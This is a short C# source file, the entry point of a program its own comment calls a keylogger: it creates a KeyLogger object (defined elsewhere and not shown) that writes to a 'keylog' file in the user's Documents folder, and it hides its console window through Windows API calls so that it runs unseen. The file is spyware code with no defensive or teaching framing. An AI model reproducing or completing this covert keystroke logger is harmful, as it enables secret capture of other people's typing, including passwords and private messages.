using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Hooks
{

    class Logger
    {
        ///<summary>
        ///This starts the keylogger.
        ///</summary>
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) +"\\keylog";
            var kl = new KeyLogger(path);
            // Hide
            ShowWindow(handle, SW_HIDE);

            Application.Run();
            kl.Deactivate();
            
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
